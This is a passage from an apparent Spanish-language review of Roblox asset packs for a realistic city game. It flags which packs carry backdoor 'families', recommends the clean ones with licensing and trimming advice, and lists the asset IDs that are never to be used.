- **83730474928094 — Gojo Moveset**: `Tool` con poderes de *Jujutsu Kaisen* (RemoteEvents, partículas,
  «Hollow Purple» que quita vida, cámara «Domain Expansion»), animaciones de Roblox no públicas, y
  atributos raros `_hXXXX=…` en cada objeto (una marca de agua del que lo resubió).

Los tres traen `LightConfig` (familia 4).

#### 78033796632460 — realistic guns mesh pack Pistol Giver (xw4m5) ⛔

Una sola malla de M4 (9.9×3.4×0.8, de thienbao2109, 2020) con un `StringValue` `_id`. Virus: familia 3
(id `103102799768392`, el mismo que el pack «Bloxburg» de la 3ª tanda).

#### 130817699186912 — The Mimic Japanese Props (healiattel) ⛔

Pozo, estandarte, ventana con persiana, torii (22.2×16.7×1.6), lámparas japonesas, jardineras, bonsái,
ramen, plantas colgantes. Decorado del juego **The Mimic**. Virus: familia 3.

#### 106442157390222 — Doors Drawer (Warpzaor68) ⛔

Cómoda de 3.1×3.3×2.7 con 3 cajones que se abren (`PrismaticConstraint` + `ProximityPrompt`) y sonidos
«Audio/drawer_open/close» del grupo **LSPLASH** (creadores de *DOORS*), no públicos. Virus: familia 5.

#### 123778443128832, 95413639317338, 133967929770771 (LiamH3ro45) ⛔

Cofre de recompensa de grupo (GroupID 8582268, 1 500 de «Currency2» cada 12 h), huevo frito
(1.3×0.1×1.5) y cartel «Caution — Out of order» con el logo de **Consult lift services** (empresa real).
Virus: familia 2.

#### 82460675146164, 78188971759943, 114120925733217, 99043731526992, 124581242124664 (healiattel) ⛔

Montón de comida (3.1×5.9×1.9), farol de santuario (4.0×8.9×4.0), mazo (0.9×3.9×1.4), pared de metal
«Area51» (1×10×20), gato-pistola (`Tool` que dispara y hace daño). Todos con virus.

## Lo mejor de esta tanda

Esta tanda es **mucho peor** que las anteriores: la mitad trae virus, justo los que más buscaba
Sebastián (palmeras, casas, ciudad japonesa, rascacielos, cielos, neumáticos). Lo aprovechable para que
la ciudad se vea realista, por orden:

1. **130967743753364 — Autoservice Props Pack.** Un taller mecánico entero, PBR y sin scripts: grúa de
   motor, gatos, caballetes, bancos, carros de herramientas, compresor, focos. Para el taller y la ITV.
2. **97902046131324 — mesh pack (11 coches europeos).** Coches aparcados muy ligeros (~4 800 tris) con
   textura y ruedas sueltas. Usarlos solo como **decorado** en calles y parkings, escalados ×1.3 y sin
   nombres de marca. (Modelos importados: si algún día hay dudas, cambiarlos.)
3. **8294099223 — Simple Lighting Pack.** Atmosphere + Bloom + ColorCorrection + SunRays limpios, y un
   cielo azul con nubes. Bajar el `DepthOfField` (o quitarlo).
4. **2161748423 + 8386763665 — vías de tren.** Vías limpias y ligeras (15, 16, 30, 60, 120 studs, tope y
   plataforma) para la estación o un tren de decorado.
5. **82136423205151 — Car Show Display.** Plataforma giratoria con foco para el concesionario (192 tris).
6. **13188926423 — Bingus Particle Pack.** 240 imágenes para partículas: lluvia, nieve, hojas, humo de
   coches y chimeneas, chispas, fuegos artificiales de fiesta.
7. **131772048424194 — pasos según el suelo.** Los 5 audios son públicos: pasos en hormigón, hierba,
   metal… mucho más realista. Dar crédito a *SCP: Containment Breach* (CC BY-SA) y quitar el nombre «SCP».
8. **4573650411 — CHP pack (solo como base).** Coches de policía con sirena pública. Quitar «CHP» y las
   marcas, y no usar sus scripts A-Chassis (pesan 900 000 tris: usar uno solo y simplificado).
9. **18777387875 — Barbados Gates (solo las puertas).** Entrada de urbanización con puertas automáticas
   y farolas. Quitar las jardineras de 448 piezas.
10. **120631576642977 — Server Rack** y **9658188636 — REALISTIC PACK!** — armario de servidores PBR para
    oficinas y comisaría, y muebles/Lighting cálido sueltos.

**No hay palmeras, casas ni cielos limpios en esta tanda.** Para palmeras seguir con las de la 3ª tanda
(13388285234 «Realistic Terrain Asset Pack» y las `PalmtreeVar0/1` de 8553512581).

## Nunca usar

- **Los 32 con puerta trasera** (familias 1-5), sobre todo los que activan `HttpEnabled`
  (114397068371248, 126164979250031, 99043731526992):
  114397068371248, 72475149726020, 109211499509239, 126164979250031 · 123778443128832, 95413639317338,
  133967929770771, 92375378852064 · 113349334619202, 122782784244668, 139484418601989, 95946642626421,
  102765136165948, 113036863157630, 83730474928094 · 116641210728889, 107730003845316, 106442157390222,
  111283915226740, 135266547724797 · 79665094662717, 82460675146164, 78188971759943, 114120925733217,
  99043731526992, 93376997873263, 124865259344404, 130817699186912, 124581242124664, 130974691456028,
  131247677717086, 78033796632460.
- **Armas**: 115493232746766, 14800241387 (además sacadas de *Apex*, *Half-Life 2*, *Call of Duty* y
  *Bad Business*).
- **Terror / SCP**: 13583409363, 14062245022, 8043394685, 17536656565, 13843689263.
- **Coches con trampa o robados**: 18577576400 («NOT MINE», `Protector 2.0`), 10897563593 y 10935800149
  (copias del pack de SubXero_X).
